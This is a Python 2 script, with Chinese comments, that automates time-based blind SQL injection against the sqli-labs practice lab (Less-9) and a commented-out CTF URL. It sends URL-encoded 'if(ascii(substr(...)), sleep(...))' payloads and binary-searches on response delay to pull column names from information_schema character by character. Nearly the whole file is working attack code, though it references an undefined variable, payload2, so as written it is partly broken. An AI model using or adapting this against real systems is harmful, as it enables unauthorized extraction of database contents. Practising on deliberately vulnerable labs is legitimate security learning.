# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
import time
import string
import time
#脚本应用于get请求单框注入情况下
#定义一个url
#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
# url='http://localhost/sqli-labs/Less-5/?id=' #布尔注入
url='http://localhost/sqli-labs/Less-9/?id=' #时间注入
#指定爆破数据库的名称
database='test'
table='interface'
#-------------------------------------------------------------------------------------------------#
for tablenum in range(0,20):
    payload1_attack = "1%27%20and%20if(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27"+database+"%27%20limit%20"+str(tablenum)+",1),"
    f = file("result.txt", "w+")
    # 定义攻击载荷
    delaytime = 1  # 定义IF语句正确后响应延时时长
    requesttimeout = 2  # httprequest的最长等待响应时长，在延时注入的场景下应该比delaytime加上网络时延大一些才可以
    keyword = 'flag.jpg'
    payload_end = "',sleep(" + str(delaytime) + "),1) -- #/*"
    password = '*/-- #'
    versionlen=0
    stop=False
    wList=[]
    Answer=''
    #需要注意的是如果wList中的数字不是字符型变量，会导致'.'等符号被误MySQL数据库认为0的情况发生
    for num in range(0,128):
        # print str(num)
        wList.append(str(num))
    for i in range(1,20):
        payload1=payload1_attack+str(i)+",1))>'"
        # payload1=payload1_database+ str(i) + ",1))>'"
        lo=0
        hi=len(wList)-1
        # print 'hi='+str(hi)
        while lo<=hi:
            try:
                # print 'lo='+str(lo)
                # print 'hi=' + str(hi)
                mid = (lo + hi) / 2
                payload = payload1 + wList[mid] + payload2
                # print payload
                # print url + payload
                time1 = time.time()
                req = urllib2.Request(url + payload)
                # print 'req is already: ' + url + quote("1' " + line + " '1'='1")
                res = urllib2.urlopen(req, data=None, timeout=requesttimeout)
                # print 'res is already '
                time2 = time.time()
                delay = time2 - time1
                if (delay > delaytime):
                    if(hi==lo or (hi-lo)==1):
                        print '第' + str(i) + '个字符为：' + wList[mid + 1] + ' 转义后为：' + str(chr(mid + 1))
                        Answer+=str(chr(mid+1))
                        f.writelines(str(chr(mid+1)))
                        break
                    # print '第' + str(i) + '个字符大于：'+wList[mid]
                    lo=mid+1
                    # break
                else:
                    # print '未找到结果'
                    if(hi==lo):
                        if (mid>0):
                            print '第' + str(i) + '个字符为：' + wList[mid] + ' 转义后为：' + str(chr(mid))
                            Answer+=str(chr(mid))
                            f.writelines(str(chr(mid)))
                        break
                    else:
                        # print '转到了这里'
                        hi=mid-1
            except Exception, e:
                print e
    f.close()
    if len(Answer)<1:
        break
    print '结果为：'+Answer
